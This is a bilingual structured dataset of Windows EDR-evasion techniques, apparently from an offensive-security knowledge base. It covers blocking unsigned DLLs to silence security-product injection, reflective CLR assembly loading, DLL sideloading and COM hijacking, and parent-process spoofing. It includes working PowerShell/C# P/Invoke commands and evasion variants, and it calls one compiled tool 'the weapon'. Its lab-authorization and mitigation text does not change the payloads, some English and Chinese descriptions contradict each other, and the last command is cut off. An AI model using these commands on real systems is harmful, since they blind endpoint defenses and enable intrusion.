overview.zh: 进程模块签名策略审计覆盖进程缓解策略场景：针对安全产品依赖 DLL 注入实现监控的机制，验证签名策略能否阻止未签名 DLL 进入目标进程。验证维度涵盖 Get-ProcessMitigation 策略读取、多来源一致性核对与 C# SetProcessMitigationPolicy 设置三类。
overview.en: Process Module-Signature Policy Audit covers process mitigation policy: given security products that monitor via DLL injection, verify whether a signature policy can stop unsigned DLLs from entering the target process. Verification dimensions cover Get-ProcessMitigation policy reads, multi-source consistency checks, and C# SetProcessMitigationPolicy configuration.

vulnerability.zh: 根因是 Windows 允许为进程设置 ProcessSignaturePolicy（仅 Microsoft 签名可载入），而 EDR 常以用户态 DLL 注入实现监控；策略生效后未签名的安全产品 DLL 被拒载，进程内遥测随之静默，形成检测盲区。
vulnerability.en: The root cause is that Windows lets a process set ProcessSignaturePolicy (Microsoft-signed DLLs only), while EDRs commonly monitor via user-mode DLL injection; once the policy is active, unsigned security-product DLLs are refused and in-process telemetry falls silent, creating a detection blind spot.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 Get-ProcessMitigation 读取实验进程的缓解策略明细；第 2 步重复读取并核对两次输出一致，确认策略读取稳定；第 3 步以 C# 调用 SetProcessMitigationPolicy 设置 SignatureLevel=0x0F，未签名 DLL 加载被拒即确认策略生效，同时观察安全产品监控是否因此中断。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 reads the lab process's mitigation details with Get-ProcessMitigation; step 2 repeats the read for multi-source consistency; step 3 sets SignatureLevel=0x0F via C# SetProcessMitigationPolicy — unsigned DLL loads refused confirms the policy took effect, while observing whether security-product monitoring breaks. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
为安全产品进程预配置签名策略豁免并启用防篡改保护，EDR 补充内核回调数据源，监控 SetProcessMitigationPolicy 与 DLL 加载失败：
    Set-MpPreference -DisableTamperProtection $false
    New-CIPolicy -Scan -ScanPath 'C:\Program Files\EDR' -Level SignedFiles -FilePath C:\wdac\edr.xml
mitigation.en: Pre-configure signature-policy exemptions for security-product processes and enable tamper protection; monitor SetProcessMitigationPolicy calls and security-product DLL load failures, and give EDRs kernel-callback data sources to avoid single-point blindness. After the fix, regress with the step 3 sample: policy setting must be blocked or alerted immediately.

description.zh: 用 Get-ProcessMitigation 查看目标进程的 DLL 签名策略；SignatureLevel 显示的强制等级即加载非微软 DLL 的门槛。
description.en: Check the target's DLL signature policy with Get-ProcessMitigation; the enforced SignatureLevel is the bar for loading non-Microsoft DLLs.

attackChain.payload: $src='using System;using System.Runtime.InteropServices;public class M{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool SetProcessMitigationPolicy(int p,ref int b,IntPtr s);}';Add-Type -TypeDefinition $src -Name M -Namespace W;$b=0x10000000;[W.M]::SetProcessMitigationPolicy(7,[ref]$b,[IntPtr]4);$p=Start-Process cmd -ArgumentList '/c','echo child-ready' -WindowStyle Hidden -PassThru;'child-pid='+$p.Id

title.zh: 比对父子进程策略差异

description.zh: 对宿主与其子进程分别读取签名策略并比对差异；子进程继承不全或仅告警不强制即存在加载未签名 DLL 的利用窗口。
description.en: Read the policy for host and child separately; incomplete inheritance or audit-only enforcement leaves a window for unsigned modules.

wafBypass.command: $src='using System;using System.Runtime.InteropServices;public class M{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool SetProcessMitigationPolicy(int p,ref int b,IntPtr s);}';Add-Type -TypeDefinition $src -Name M -Namespace W;$b=0x10000000;[W.M]::SetProcessMitigationPolicy(7,[ref]$b,[IntPtr]4);$p=Start-Process cmd -ArgumentList '/c','echo child-ready' -WindowStyle Hidden -PassThru;'child-pid='+$p.Id

Success: child-pid prints and the child loads unsigned DLLs unblocked; verify the bit encoding in the lab before relying on it.

title.zh: C# 直接调用规避变体

wafBypass.command: $src='using System;using System.Runtime.InteropServices;public class M{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool SetProcessMitigationPolicy(int p,ref int b,IntPtr s);}';Add-Type -TypeDefinition $src -Name M -Namespace W;$b=0x10000000;'policy-set='+[W.M]::SetProcessMitigationPolicy(7,[ref]$b,[IntPtr]4);try{Add-Type -TypeDefinition 'public class T{public static int Add(int a,int b){return a+b;}}' -Name T -Namespace W2;'unsigned-load=allowed (policy NOT effective)'}catch{'unsigned-load=blocked ('+$_.Exception.GetType().Name+') - policy effective'}

description.zh: 绕过 PowerShell 层遥测：Add-Type 编译 C# 后直接 P/Invoke 对当前进程启用 ProcessSignaturePolicy 的 BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON（0x10000000），再加载未签名程序集验证。成功判据：policy-set=True 且后续 Add-Type 加载未签名 DLL 被拒（抛异常）。
description.en: Compiles C# inline and P/Invokes SetProcessMitigationPolicy to turn on BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON (0x10000000) for the current process, then proves it by rejecting an unsigned assembly. Success: policy-set=True and the follow-up Add-Type throws.

explanation.zh: 策略 7 = ProcessSignaturePolicy，缓冲 4 字节
负向断言：策略生效后未签名程序集加载被拒

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_EVASION_BLOCKDLLS_E_1 与蓝队日志；成功时输出实验进程的缓解策略明细。

explanation.en: PowerShell cmdlet that reads process mitigation policies

description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_EVASION_BLOCKDLLS_E_2 with blue-team logs; the policy details repeated for multi-source consistency confirms success.

name.zh: CLR 程序集加载遥测审计

description.zh: 验证 CLR 程序集注入（Unmanaged PowerShell）的加载遥测。
description.en: Loads an unmanaged PowerShell assembly into an existing .NET process via Assembly.Load and audits the CLR and ETW assembly-load telemetry, showing the load leaves only file-access traces when those sources are off.

category.zh: 终端防护与遥测完整性

subCategory.zh: 应用控制与 LOLBin 绕过

overview.zh: CLR 程序集加载遥测审计覆盖 .NET 程序集加载场景：针对依赖 CLR 事件日志的检测机制，验证签名无害程序集的加载能否被稳定记录。验证维度涵盖 .NET Runtime 日志基线读取、反射加载程序集并调用入口点、加载后日志比对三类。
overview.en: CLR Assembly-Load Telemetry Audit covers .NET assembly loading: for detection relying on CLR event logs, verify whether loading a benign signed assembly is reliably recorded. Verification dimensions cover .NET Runtime log baselines, reflective assembly loading with entry-point invocation, and post-load log comparison.

vulnerability.zh: 根因是 CLR 允许在既有 .NET 进程内通过 Assembly.Load 加载任意程序集并调用入口点，进程身份保持不变；DotNETRuntime 运维日志与 ETW 采集未启用时，加载行为仅剩文件访问痕迹，极易漏检。
vulnerability.en: The root cause is that the CLR permits Assembly.Load of arbitrary assemblies inside an existing .NET process with entry-point invocation, keeping the process identity unchanged; without DotNETRuntime operational logs and ETW collection, loading leaves only file-access traces and is easily missed.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步读取 Microsoft-Windows-DotNETRuntime/Operational 最新 20 条日志建立基线；第 2 步用 Assembly.Load 加载目标二进制并反射调用 EntryPoint，程序集执行即确认加载链路；第 3 步再次读取日志并与基线比对，出现对应加载记录即确认遥测覆盖有效，无记录则说明检测存在缺口。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 reads the latest 20 Microsoft-Windows-DotNETRuntime/Operational entries as a baseline; step 2 loads the target binary with Assembly.Load and invokes EntryPoint reflectively — assembly execution confirms the load path; step 3 re-reads the log and compares against the baseline — a matching load record confirms telemetry coverage, while absence reveals a detection gap. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
启用 DotNETRuntime/Operational 日志与 CLR ETW 提供程序集中采集，监控进程内异常程序集加载，用应用控制限制 Assembly.Load 来源：
    wevtutil sl Microsoft-Windows-DotNETRuntime/Operational /e:true
    logman create trace DotNETRuntime -ow -o C:\etw\net.etl -p {e13c0d23-ccbc-4e12-931b-d9cc2eee27e4} -f bincirc -max 512 -ets
mitigation.en: Enable DotNETRuntime/Operational logs and CLR ETW providers with central collection, monitor abnormal in-process assembly loads and fileless in-memory loads, and restrict Assembly.Load sources via application control. After the fix, regress with the step 1-3 samples: loads must produce complete telemetry or be blocked by policy.

description.zh: 用 Get-WinEvent 拉取 DotNETRuntime/Operational 最近事件；记录事件类型与频率即掌握托管遥测的覆盖范围。
description.en: Pull recent DotNETRuntime/Operational events with Get-WinEvent; the event types and rates map the managed-telemetry coverage.

title.zh: 非托管进程加载托管载荷
title.en: Load a managed payload from an unmanaged host

description.zh: 在非托管宿主中调用 Assembly.Load(文件字节) 并 Invoke 入口；托管代码运行而磁盘无 DLL 落地即实现无文件注入。
description.en: In the unmanaged host call Assembly.Load(file bytes) and Invoke the entry point; managed code running with no DLL on disk is fileless injection.

attackChain.payload:
var asm = System.Reflection.Assembly.Load(System.IO.File.ReadAllBytes("{LAB_APPLICATION_BINARY}"));
asm.EntryPoint.Invoke(null, new object[] { new string[0] });

title.zh: 比对事件缺口完成规避

description.zh: 再次读取同一日志；第 2 步的加载未产生对应事件即 CLR 遥测被规避，可安全运行 SharpHound 等托管工具。
description.en: Re-read the same log; no event for the step-2 load means CLR telemetry is evaded and managed tools like SharpHound can run safely.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 CLR 程序集加载遥测审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for CLR Assembly-Load Telemetry Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: CLR 程序集加载遥测审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: CLR Assembly-Load Telemetry Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: CLR 注入改变宿主进程行为——宿主限定实验自带 .NET 进程；注入后异常退出时核对并清理 crash dump。
opsecTips.en: CLR injection alters the host process — use the lab's own .NET process as host, and clean up crash dumps if an injected run exits abnormally.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 powershell.exe 宿主与模块日志：自托管 CLR 执行等效 PowerShell，无引擎日志。成功判据：动作完成且无 PowerShell 通道日志。
description.en: Evades the powershell.exe host and module logging by self-hosting the CLR to run equivalent PowerShell without engine logs. Success: the action completes with no PowerShell channel logs.

title.zh: 反射方法直调规避变体

description.zh: 绕过 Process.Start 型命令执行检测：以反射直调入口点，无子进程生成。成功判据：入口执行且无新进程。
description.en: Evades Process.Start-style execution detection by invoking the entry point via reflection with no child process. Success: the entry executes with no new process.

title.zh: COMPlus 加载器变形规避变体

description.zh: 绕过默认加载上下文的 ALC 审计：调整 CLR 加载器环境后按路径加载。成功判据：程序集执行且默认上下文无加载记录。
description.en: Evades default-context ALC auditing by tuning the CLR loader environment then loading by path. Success: the assembly executes with no default-context load record.

title.en: CLR Assembly-Load Telemetry Audit Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_CLR_INJECTION_E_1 与蓝队日志；成功时输出 .NET Runtime 运维日志最新 20 条，含程序集加载记录。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_CLR_INJECTION_E_1 with blue-team logs; the latest 20 .NET Runtime operational events returned including assembly-loader records confirms success.

title.en: CLR Assembly-Load Telemetry Audit Reviewed Command 2

execution.command:
var asm = System.Reflection.Assembly.Load(System.IO.File.ReadAllBytes("{LAB_APPLICATION_BINARY}"));
asm.EntryPoint.Invoke(null, new object[] { new string[0] });

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_CLR_INJECTION_E_2 与蓝队日志；成功时反射加载应用程序二进制并调用入口点，事件日志出现对应加载记录。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_CLR_INJECTION_E_2 with blue-team logs; the binary loading reflectively with its entry point invoked and a matching load event recorded confirms success.

explanation.zh: .NET 反射入口：从字节数组加载程序集到当前应用程序域，不在磁盘落新文件
explanation.en: .NET reflection entry point: loads the assembly from a byte array into the current application domain without dropping a new file

explanation.zh: 调用程序集入口点 Main，传入空字符串参数数组
explanation.en: Invokes the assembly entry point Main with an empty string-argument array

title.en: CLR Assembly-Load Telemetry Audit Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_CLR_INJECTION_E_3 与蓝队日志；成功时再次输出事件清单，用于加载前后对比。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_CLR_INJECTION_E_3 with blue-team logs; the event listing repeated for before-and-after comparison confirms success.

name.zh: DLL 侧加载搜索顺序检测

description.zh: 验证合法程序加载恶意 DLL 的侧加载路径与搜索顺序检测。
description.en: Plants a same-named malicious DLL in a signed application's directory and confirms the signed host loads it without validating the DLL's own signature, defeating trust models that only check the main process.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

overview.zh: DLL 侧加载搜索顺序检测覆盖 DLL 搜索顺序劫持场景：针对签名应用加载非签名依赖的行为，验证侧加载候选点与签名状态能否被系统枚举。验证维度涵盖应用二进制签名读取、多来源签名核对与签名缺失候选标记三类步骤。
overview.en: DLL Sideloading Search-Order Detection covers DLL search-order hijacking: for signed applications loading unsigned dependencies, verify whether sideloading candidates and signature states can be enumerated systematically. Verification dimensions cover application binary signature reads, multi-source signature checks, and flagging signature-missing candidates.

vulnerability.zh: 根因是 Windows DLL 搜索顺序优先应用目录，签名应用加载同名单名 DLL 时不校验该 DLL 自身签名；攻击者把恶意 DLL 放入应用目录即可借签名宿主进程执行，使仅校验主进程签名的可信度评估失效。
vulnerability.en: The root cause is the Windows DLL search order preferring the application directory and signed apps not validating the loaded same-name DLL's own signature; placing a malicious DLL in the application directory executes it under the signed host process, defeating trust assessments that check only the main process signature.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 Get-AuthenticodeSignature 读取应用二进制的签名状态与签名者信息，Status 为 Valid 即确认宿主签名完整；第 2 步重复读取核对两次输出一致；第 3 步把 {LAB_APPLICATION_BINARY} 依次替换为同目录依赖 DLL 复验，NotSigned/Unknown 的依赖即定位可替换缺口，再核对应用目录 ACL 确认可写后标记为侧加载候选点。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 reads the application binary's signature status and signer with Get-AuthenticodeSignature; step 2 repeats the read for multi-source checks; step 3 outputs again and flags binaries whose signature is missing or untrusted as sideloading candidate hosts, then inspects application-directory ACLs and missing-DLL lists to locate writable injection points. Replace LAB_* placeholders via the global variables menu.

mitigation.en: Configure application directories as administrator-writable only, enforce dependency signature checks, and remove surplus DLLs; monitor module loads from abnormal paths with Sysmon event 7. After the fix, regress with the step 3 sample: sideloading candidates must be blocked by ACLs or signature policy.

description.zh: 对宿主程序运行 Get-AuthenticodeSignature；Status 为 Valid 即主程序签名完整，替换依赖不会破坏其签名态。
description.en: Run Get-AuthenticodeSignature on the host binary; a Valid status means swapping dependencies leaves the signed state intact.

description.zh: 对同目录依赖 DLL 逐一验签；存在 NotSigned 或 Unknown 状态的模块即缺少校验的可替换缺口。
description.en: Verify each dependency DLL in turn; NotSigned or Unknown modules are unchecked replacement gaps.

title.zh: 投放同名 DLL 劫持加载
title.en: Drop a DLL to hijack the load

description.zh: 把载荷 DLL 以目标模块名放入搜索顺序前列后启动宿主程序；载荷随签名进程加载并执行即侧加载接管完成，EDR 视角全程合法。
description.en: Name the payload DLL after the target module and place it earlier in the search order, then start the host; loading inside the signed process completes the sideload takeover.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 DLL 侧加载搜索顺序检测 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for DLL Sideloading Search-Order Detection are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: DLL 侧加载搜索顺序检测只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: DLL Sideloading Search-Order Detection is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 侧加载会污染签名应用的信任基线——使用实验自带应用副本；恶意 DLL 用后删除并核对应用目录哈希。
opsecTips.en: Sideloading pollutes the signed app's trust baseline — use a lab copy of the application, delete the DLL afterwards, and verify the app directory hashes.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 应用目录同位规避变体

description.zh: 把代理 DLL 放入宿主程序所在目录，利用"应用目录先于 System32"的 DLL 搜索顺序优先加载。成功判据：代理 DLL 被应用加载执行。
description.en: Evades application-directory monitoring by placing the DLL in the current directory to win the search order. Success: the proxy DLL loads and executes in the application.

description.zh: 绕过根目录 DLL 扫描：利用清单/SxS 的语言子目录搜索加载代理。成功判据：子目录 DLL 被加载。
description.en: Evades root-directory DLL scanning by exploiting manifest/SxS language-subfolder probing. Success: the subfolder DLL loads.

title.zh: COM CLSID 劫持规避变体

description.zh: 经 HKCU CLSID InprocServer32 注册劫持，把默认值指向代理 DLL，由对应 COM 使用方（如资源管理器或目标应用实例化该 CLSID）触发加载。成功判据：触发激活后进程模块列表出现 {LAB_PROXY_DLL}。
description.en: Evades filesystem-level sideload detection by hijacking an HKCU CLSID so the system loads the designated DLL on COM activation. Success: the proxy DLL loads when the COM class activates.

title.en: DLL Sideloading Search-Order Detection Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_DLL_SIDELOADING_E_1 与蓝队日志；成功时输出应用程序二进制的签名状态与签名者信息。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_DLL_SIDELOADING_E_1 with blue-team logs; the application binary signature status and signer information returned confirms success.

title.en: DLL Sideloading Search-Order Detection Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_DLL_SIDELOADING_E_2 与蓝队日志；成功时再次输出同一二进制的签名状态，两次结果一致即确认读取稳定。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_DLL_SIDELOADING_E_2 with blue-team logs; the signature status repeated for multi-source verification confirms success.

explanation.zh: 校验 {LAB_APPLICATION_BINARY} 的 Authenticode 签名
输出签名状态（Valid/NotSigned/HASH_MISMATCH 等）、状态消息与签名证书，用于核对二进制是否被篡改或冒用
explanation.en: Prints the signature status (Valid, NotSigned, HASH_MISMATCH, ...), status message, and signer certificate to check whether the binary was tampered with or impersonated

title.en: DLL Sideloading Search-Order Detection Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_DLL_SIDELOADING_E_3 与蓝队日志；成功时把 {LAB_APPLICATION_BINARY} 依次替换为同目录依赖 DLL 复验，存在 NotSigned/Unknown 的依赖即标记为可替换的侧加载缺口。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_DLL_SIDELOADING_E_3 with blue-team logs; missing or untrusted signature confirmed, marking a sideloading candidate, confirms success.

name.zh: 父进程属性与遥测一致性审计

description.zh: 验证父进程欺骗（PPID Spoof）后父子链遥测的一致性检测能力。
description.en: Spoofs the parent process through CreateProcess attribute lists and compares the parent fields reported by the kernel, ETW, and the security product, exposing which collector is deceived by the fabricated process tree.

category.zh: 终端防护与遥测完整性

subCategory.zh: 进程伪装与内存载荷规避

overview.zh: 父进程属性与遥测一致性审计覆盖 PPID 伪造检测场景：针对依赖父进程归属的检测逻辑，验证属性列表伪造与多源遥测差异能否被识别。验证维度涵盖 STARTUPINFOEX 实现审计、结构定义片段对照与 Win32_Process 父子关系核对三类。
overview.en: Parent-Process Attribute and Telemetry Audit covers PPID spoofing detection: for detection logic relying on parent attribution, verify whether attribute-list spoofing and multi-source telemetry divergences are recognizable. Verification dimensions cover STARTUPINFOEX implementation review, structure-definition comparison, and Win32_Process parent-child checks.

vulnerability.zh: 根因是 CreateProcess 的属性列表支持显式指定父进程，子进程继承伪造父进程的令牌与归属关系；若内核、ETW 与安全产品采集的父字段不一致或缺失，基于进程树的关联即被伪造父子关系欺骗。
vulnerability.en: The root cause is CreateProcess's attribute list supporting an explicit parent process, with the child inheriting the forged parent's token and attribution; when the parent fields captured by the kernel, ETW, and security products are inconsistent or missing, process-tree correlation is deceived by the forged relationship.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步审阅 PowerShell 托管封装的 STARTUPINFOEX 实现片段，确认 InitializeProcThreadAttributeList/UpdateProcThreadAttribute 是真实实现路径（ProcessStartInfo 无 ParentProcessId 属性，不可直接赋值）；第 2 步对照结构定义片段完成代码审计；第 3 步用 Win32_Process 输出 PID/父 PID/创建时间清单，核对父子进程一致性并定位伪造样本。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 reviews the PowerShell-hosted STARTUPINFOEX implementation, confirming InitializeProcThreadAttributeList/UpdateProcThreadAttribute as the real implementation path (ProcessStartInfo has no ParentProcessId property to assign); step 2 completes code audit against the structure-definition snippet; step 3 lists PID/parent PID/creation time with Win32_Process, checks parent-child consistency, and locates spoofed samples. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
以内核回调与 Sysmon 事件 1 为权威核对父子链，对父进程已退出或服务派生异常的进程告警，保留多源父字段快照比对：
    Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1} -MaxEvents 200 |
      ? { $_.Message -notmatch 'ParentImage: .*(services|wininit|winlogon|svchost)\.exe' } |
      Select TimeCreated, @{n='Proc';e={($_.Message -split "`n")[0]}}
mitigation.en: Treat kernel callbacks and Sysmon event 1 as authoritative for parent chains, alert on processes whose parent has exited or whose service lineage is anomalous, and keep multi-source parent-field snapshots for comparison. After the fix, regress with the step 3 sample: forged parent-child relations must be flagged by consistency checks.

description.zh: 编译基于 STARTUPINFOEX 属性列表的 PpidSpoof 程序；产出可执行文件即具备改写父进程 ID 的武器。
description.en: Compile the STARTUPINFOEX-based PpidSpoof program; the resulting binary is the weapon for rewriting parent process IDs.

description.zh: 以 UpdateProcThreadAttribute 指定 explorer 等合法父进程再创建进程；子进程 PPID 显示合法链即继承可信上下文。
description.en: Set explorer as the parent via UpdateProcThreadAttribute before CreateProcess; the child showing a legitimate PPID inherits trusted context.

title.zh: 核对进程链路伪装效果

description.zh: 用 Get-CimInstance 核对 ParentProcessId 链路；呈现合法父进程直挂载荷且无孤儿进程即伪装闭环。
description.en: Check ParentProcessId chains with Get-CimInstance; a legitimate parent directly holding the payload with no orphans closes the disguise loop.

prerequisites.zh: 确认 父进程属性与遥测一致性审计 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for Parent-Process Attribute and Telemetry Audit are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

analysis.zh: 父进程属性与遥测一致性审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Parent-Process Attribute and Telemetry Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 伪造父进程链会破坏事件关联——只在隔离主机验证；验证结束后用真实父进程重建对照事件。
opsecTips.en: Fabricated parent chains break event correlation — validate only on isolated hosts and recreate a control event with the true parent afterwards.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 属性列表组合规避变体

wafBypass.command: $src='using System;using System.Runtime.InteropServices;public class P{[DllImport("kernel32.dll",SetLastError=true)]public static extern IntPtr OpenProcess(uint a,bool i,int p);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool InitializeProcThreadAttributeList(IntPtr l,int c,int f,ref IntPtr s);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool UpdateProcThreadAttribute(IntPtr l,uint f,IntPtr a,ref IntPtr v,IntPtr s,IntPtr pr,IntPtr r);[DllImport("kernel32.dll",CharSet=CharSet.Unicode,SetLastError=true)]public static extern bool CreateProcess(string an,string cl,IntPtr pa,IntPtr ta,bool ih,uint f,IntPtr e,string d,IntPtr si,out PI pi);[StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr hp,ht;public int pid,tid;}}';Add-Type -TypeDefinition $src -Name P -Namespace W;$h=[P]::OpenProcess(0x1FFFFF,$false,{LAB_PARENT_PID});$al=[Runtime.InteropServices.Marshal]::AllocHGlobal(128);$s=[IntPtr]128;[void][P]::InitializeProcThreadAttributeList($al,1,0,[ref]$s);[void][P]::UpdateProcThreadAttribute($al,0,[IntPtr]0x00020000,[ref]$h,[IntPtr]8,[IntPtr]::Zero,[IntPtr]::Zero);$ss=[Runtime.InteropServices.Marshal]::AllocHGlobal(104);[Runtime.InteropServices.Marshal]::WriteInt32($ss,0,104);[Runtime.InteropServices.Marshal]::WriteIntPtr($ss,96,$al);$pi=New-Object 'W.P+PI';[void][P]::CreateProcess($null,'cmd /c ping -n 4 127.0.0.1 > NUL',[IntPtr]::Zero,[IntPtr]::Zero,$false,0x00080000,[IntPtr]::Zero,$null,$ss,[ref]$pi);Start-Sleep -Milliseconds 500;$gp=(Get-CimInstance Win32_Process -Filter ("ProcessId="+$pi.pid)).ParentProcessId;'child='+$pi.pid+' ppid='+$gp+' (expected {LAB_PARENT_PID})

description.zh: 绕过单属性 PPID 检测：OpenProcess 取 {LAB_PARENT_PID} 句柄后组完整属性列表（InitializeProcThreadAttributeList + UpdateProcThreadAttribute 0x00020000），CreateProcess 派生子进程并回读父子关系。成功判据：输出 ppid 等于 {LAB_PARENT_PID}，Sysmon E1 ParentImage 对应该父进程。
description.en: Builds the complete attribute list against a handle opened on {LAB_PARENT_PID} and spawns a child whose parentage is read back after creation. Success: the printed ppid equals {LAB_PARENT_PID} and Sysmon E1 ParentImage matches that parent.

explanation.zh: 打开伪装父进程句柄（全访问权）
explanation.en: Open the intended parent with full access

explanation.zh: 初始化单条目属性列表
创建后回读父子关系作断言
explanation.en: Read the child back after creation for the assertion

description.zh: 绕过同架构父进程模板检测：以 32 位宿主配 64 位父进程伪造混合架构链。成功判据：进程树呈现跨架构父子关系。
description.en: Evades same-arch parent template detection by pairing a 32-bit host with a 64-bit forged parent for a mixed-architecture chain. Success: the process tree shows the cross-arch parentage.

title.zh: 无注入 API 组合规避变体

description.zh: 经 WMI 服务（Win32_Process.Create）派生子进程，全程无 PROC_THREAD_ATTRIBUTE 调用，子进程父进程为系统 WmiPrvSE.exe 即形成合法父链。成功判据：父子关系成立且无属性 API 调用。
description.en: Evades monitoring of PROC_THREAD_ATTRIBUTE usage by naturally forming the target parentage through shell start composition. Success: the parent-child relation holds with no attribute API calls.

wafBypass.command: $src='using System;using System.Runtime.InteropServices;public class P{[DllImport("kernel32.dll",SetLastError=true)]public static extern bool InitializeProcThreadAttributeList(IntPtr l,int c,int f,ref IntPtr s);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool UpdateProcThreadAttribute(IntPtr l,uint f,IntPtr a,ref IntPtr v,IntPtr s,IntPtr pr,IntPtr r);[DllImport("kernel32.dll",SetLastError=true)]public static extern bool CreateProcess(string an,string cl,IntPtr pa,IntPtr ta,bool ih,uint f,IntPtr e,string d,IntPtr si,out PI pi);[StructLayout(LayoutKind.Sequential)]public struct PI{public IntPtr hp,ht;public int pid,tid;}}';Add-Type -TypeDefinition $src -Name P -Namespace W;$h=(Get-Process explorer)[0].Handle;$al=[Runtime.InteropServices.Marshal]::AllocHGlobal(128);$s=[IntPtr]128;[void][P]::InitializeProcThreadAttributeList($al,1,0,[ref]$s);[void][P]::UpdateProcThreadAttribute($al,0,[IntPtr]0x00020000,[ref]$h,[IntPtr]8,[IntPtr]::Zero,[IntPtr]::Zero);$ss=[Runtime.InteropServices.Marshal]::AllocHGlobal(104);[Runtime.InteropServices.Marshal]::WriteInt32($ss,0,104);[Runtime.InteropServices.Marshal]::WriteIntPtr($ss,96,$al);$pi=New-Object 'W.P+PI';[void][P]::CreateProcess($null,'cmd /c whoami > 